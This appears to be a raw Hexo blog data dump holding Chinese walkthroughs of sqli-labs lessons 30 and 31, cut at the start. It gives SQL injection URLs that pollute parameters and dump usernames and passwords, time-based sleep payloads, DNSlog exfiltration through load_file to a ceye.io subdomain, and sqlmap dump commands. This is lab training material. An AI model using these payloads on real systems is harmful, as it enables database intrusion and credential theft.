class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/005.png\" alt=\"005\"></p>\n<p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,database(),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(username,&#39;~&#39;,password) from security.users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique B:检查布尔型注入</span></span><br><span class=\"line\"><span class=\"deletion\">--dbms 10：后端数据库设置为mysql</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 2：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B --dbms mysql --level 2 -v 2</code></p>\n<p><img src=\"/img/sql/Lesson-30/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-30/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B --dbms mysql --dbs --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/012.png\" alt=\"012\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B mysql -D security --tables --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B mysql -D security -T users --columns --dump --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/014.png\" alt=\"014\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-30/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>真正有WAF的页面是login.php,根据题目来做的话要把这行代码注释掉,不使用报错。</p>\n<p><img src=\"/img/sql/Lesson-30/002.png\" alt=\"002\"></p>\n<p>过滤都和Lesson-29一样,只是这里用双引号闭合，需要把显示账号密码注释后的再改改弄的像Lesson-8才是布尔型盲注。</p>\n<p>这里太麻烦了没弄。</p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2&quot; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2&quot; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/004.png\" alt=\"004\"></p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/005.png\" alt=\"005\"></p>\n<p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,database(),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=-2&quot;union select 1,(select group_concat(username,&#39;~&#39;,password) from security.users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique B:检查布尔型注入</span></span><br><span class=\"line\"><span class=\"deletion\">--dbms 10：后端数据库设置为mysql</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 2：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B --dbms mysql --level 2 -v 2</code></p>\n<p><img src=\"/img/sql/Lesson-30/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-30/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B --dbms mysql --dbs --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/012.png\" alt=\"012\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B mysql -D security --tables --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2*&quot; --technique B mysql -D security -T users --columns --dump --threads 10</code></p>\n<p><img src=\"/img/sql/Lesson-30/014.png\" alt=\"014\"></p>\n"},{"title":"sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用","date":"2018-10-14T09:44:55.000Z","_content":"\n# sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-31/001.png)\n\n## 分析\n\n除了闭合方式不一样,和Lesson-29和Lesson-30有什么区别。修改代码为时间盲注,用DNSlog做。\n\n修改代码如下：\n\n```\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n\t  \t//echo \"<font size='5' color= '#99FF00'>\";\t\n\t  \t//echo 'Your Login name:'. $row['username'];\n\t  \t//echo \"<br>\";\n\t  \t//echo 'Your Password:' .$row['password'];\n\t\techo '<font color= \"#FFFF00\">';\n\t\techo 'Hello World';\n\t  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\t\techo '<font color= \"#FFFF00\">';\n\t\techo 'Hello World';\n\t\t//print_r(mysql_error());\n\t\techo \"</font>\";  \n\t}\n```\n\n## 注入\n\n利用http://ceye.io  环境的DNSlog\n\n### 判断类型\n\n`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2\") and if(1,sleep(60),null)%23`\n\n![002](/img/sql/Lesson-31/002.png)\n\n![003](/img/sql/Lesson-31/003.png)\n\n判断为用`\")`闭合\n\n### 获取列数\n\n`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2\") union select 1,2,3 and if(1,sleep(60),null)%23`\n\n![004](/img/sql/Lesson-31/004.png)\n\n### 获取数据库名\n\n这里我原来的环境的ip地址访问不到dns。虚拟机环境切换成桥接。\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select database()),'.域名.ceye.io\\\\abc'))),3%23`\n\n![005](/img/sql/Lesson-31/005.png)\n\n### 获取表名\n\n只能一个一个获取\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema='security' limit 3,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![006](/img/sql/Lesson-31/006.png)\n\n### 获取列名\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select (column_name) from information_schema.columns where table_name='users' and table_schema='security' limit 2,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![007](/img/sql/Lesson-31/007.png)\n\n### 获取字段\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select concat(username,'_',password) from users limit 1,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![008](/img/sql/Lesson-31/008.png)\n\n## SQLMAP\n\n```\n--technique T:注入方式为时间注入\n--dbms 10：后端数据库设置为mysql\n--threads 10:并发线程设置为10\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n```\n\n`sqlmap -u http://10.60.250.250/sql/Less-31/login.php?id=1&id=2 --dbms mysql --technique T --level 2 --threads 10 -v 3 --flush-session --fresh-queries`\n\n![009](/img/sql/Lesson-31/009.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -v 3 --dbs`\n\n![010](/img/sql/Lesson-31/010.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -D security --tables`\n\n![011](/img/sql/Lesson-31/011.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-31/012.png)","source":"_posts/sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用.md","raw":"---\ntitle: sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用\ndate: 2018-10-14 17:44:55\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-31/001.png)\n\n## 分析\n\n除了闭合方式不一样,和Lesson-29和Lesson-30有什么区别。修改代码为时间盲注,用DNSlog做。\n\n修改代码如下：\n\n```\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n\t  \t//echo \"<font size='5' color= '#99FF00'>\";\t\n\t  \t//echo 'Your Login name:'. $row['username'];\n\t  \t//echo \"<br>\";\n\t  \t//echo 'Your Password:' .$row['password'];\n\t\techo '<font color= \"#FFFF00\">';\n\t\techo 'Hello World';\n\t  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\t\techo '<font color= \"#FFFF00\">';\n\t\techo 'Hello World';\n\t\t//print_r(mysql_error());\n\t\techo \"</font>\";  \n\t}\n```\n\n## 注入\n\n利用http://ceye.io  环境的DNSlog\n\n### 判断类型\n\n`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2\") and if(1,sleep(60),null)%23`\n\n![002](/img/sql/Lesson-31/002.png)\n\n![003](/img/sql/Lesson-31/003.png)\n\n判断为用`\")`闭合\n\n### 获取列数\n\n`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2\") union select 1,2,3 and if(1,sleep(60),null)%23`\n\n![004](/img/sql/Lesson-31/004.png)\n\n### 获取数据库名\n\n这里我原来的环境的ip地址访问不到dns。虚拟机环境切换成桥接。\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select database()),'.域名.ceye.io\\\\abc'))),3%23`\n\n![005](/img/sql/Lesson-31/005.png)\n\n### 获取表名\n\n只能一个一个获取\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema='security' limit 3,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![006](/img/sql/Lesson-31/006.png)\n\n### 获取列名\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select (column_name) from information_schema.columns where table_name='users' and table_schema='security' limit 2,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![007](/img/sql/Lesson-31/007.png)\n\n### 获取字段\n\n`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\") union select 1,(select load_file(concat('\\\\\\\\',(select concat(username,'_',password) from users limit 1,1) ,'.kg74jx.ceye.io\\\\abc'))),3%23`\n\n![008](/img/sql/Lesson-31/008.png)\n\n## SQLMAP\n\n```\n--technique T:注入方式为时间注入\n--dbms 10：后端数据库设置为mysql\n--threads 10:并发线程设置为10\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n```\n\n`sqlmap -u http://10.60.250.250/sql/Less-31/login.php?id=1&id=2 --dbms mysql --technique T --level 2 --threads 10 -v 3 --flush-session --fresh-queries`\n\n![009](/img/sql/Lesson-31/009.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -v 3 --dbs`\n\n![010](/img/sql/Lesson-31/010.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -D security --tables`\n\n![011](/img/sql/Lesson-31/011.png)\n\n`sqlmap -u \"http://10.60.250.250/sql/Less-31/login.php?id=1&id=2\" --dbms mysql --technique T --level 2 --threads 10 -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-31/012.png)","slug":"sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用","published":1,"updated":"2019-06-19T17:23:13.391Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3iste000424dsbq1lze0kf","content":"<h1 id=\"sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-31/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>除了闭合方式不一样,和Lesson-29和Lesson-30有什么区别。修改代码为时间盲注,用DNSlog做。</p>\n<p>修改代码如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=(<span class=\"variable\">$id</span>) LIMIT 0,1\"</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$result</span>=mysql_query(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$row</span> = mysql_fetch_array(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;font size='5' color= '#99FF00'&gt;\"</span>;\t</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">'Your Login name:'</span>. <span class=\"variable\">$row</span>[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">'Your Password:'</span> .<span class=\"variable\">$row</span>[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'&lt;font color= \"#FFFF00\"&gt;'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">\t  \t<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;</span><br><span class=\"line\">  \t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'&lt;font color= \"#FFFF00\"&gt;'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">\t\t//print_r(mysql_error());</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;  </span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用<a href=\"http://ceye.io\" target=\"_blank\" rel=\"noopener\">http://ceye.io</a>  环境的DNSlog</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.133/sql/Less-31/login.php?id=1&amp;id=2&quot;) and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-31/003.png\" alt=\"003\"></p>\n<p>判断为用<code>&quot;)</code>闭合</p>\n<h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>http://192.168.75.133/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,2,3 and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/004.png\" alt=\"004\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p>这里我原来的环境的ip地址访问不到dns。虚拟机环境切换成桥接。</p>\n<p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p>只能一个一个获取</p>\n<p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/006.png\" alt=\"006\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 2,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/007.png\" alt=\"007\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select concat(username,&#39;_&#39;,password) from users limit 1,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/008.png\" alt=\"008\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique T:注入方式为时间注入</span></span><br><span class=\"line\"><span class=\"deletion\">--dbms 10：后端数据库设置为mysql</span></span><br><span class=\"line\"><span class=\"deletion\">--threads 10:并发线程设置为10</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 3：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2 --dbms mysql --technique T --level 2 --threads 10 -v 3 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-31/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -v 3 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-31/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-31/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-31/012.png\" alt=\"012\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-31-GET盲注-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-31/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>除了闭合方式不一样,和Lesson-29和Lesson-30有什么区别。修改代码为时间盲注,用DNSlog做。</p>\n<p>修改代码如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=(<span class=\"variable\">$id</span>) LIMIT 0,1\"</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$result</span>=mysql_query(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$row</span> = mysql_fetch_array(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;font size='5' color= '#99FF00'&gt;\"</span>;\t</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">'Your Login name:'</span>. <span class=\"variable\">$row</span>[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">\t  \t//<span class=\"built_in\">echo</span> <span class=\"string\">'Your Password:'</span> .<span class=\"variable\">$row</span>[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'&lt;font color= \"#FFFF00\"&gt;'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">\t  \t<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;</span><br><span class=\"line\">  \t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'&lt;font color= \"#FFFF00\"&gt;'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">\t\t//print_r(mysql_error());</span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;  </span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用<a href=\"http://ceye.io\" target=\"_blank\" rel=\"noopener\">http://ceye.io</a>  环境的DNSlog</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.133/sql/Less-31/login.php?id=1&amp;id=2&quot;) and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-31/003.png\" alt=\"003\"></p>\n<p>判断为用<code>&quot;)</code>闭合</p>\n<h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>http://192.168.75.133/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,2,3 and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/004.png\" alt=\"004\"></p>\n<h3 